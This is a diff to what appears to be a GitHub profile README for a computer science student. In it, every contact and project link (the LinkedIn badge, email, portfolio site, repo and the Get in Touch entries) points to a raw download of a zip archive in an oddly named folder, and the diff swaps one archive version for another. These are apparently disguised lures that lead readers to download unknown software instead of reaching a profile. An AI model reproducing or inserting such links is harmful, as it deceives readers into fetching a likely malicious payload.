@@ -1,8 +1,8 @@
 # 👋 Hi, I'm Gujja Sai Ganesh
 
 **Location:** Hyderabad, Telangana  
-[![LinkedIn](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)  
-📧 https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip
+[![LinkedIn](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip)](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip)  
+📧 https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip
 
 ---
 
@@ -31,7 +31,7 @@ I'm a passionate Computer Science student specializing in **Artificial Intellige
 ### 💱 Currency Converter
 > User-friendly, Python-based currency converter with real-time exchange rates and instant, clear results.
 
-### 🖥️ [Portfolio Website](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip) ([repo](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip))
+### 🖥️ [Portfolio Website](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip) ([repo](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip))
 > A clean, interactive, and easy-to-navigate GUI portfolio built with HTML, CSS, and JavaScript.
 
 ---
@@ -46,9 +46,9 @@ I'm a passionate Computer Science student specializing in **Artificial Intellige
 
 ## 📫 Get in Touch
 
-- **Email:** https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip
-- **LinkedIn:** [https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)
-- **Portfolio:** [https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)
+- **Email:** https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip
+- **LinkedIn:** [https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip)
+- **Portfolio:** [https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software-v3.3.zip)
 
 ---
 
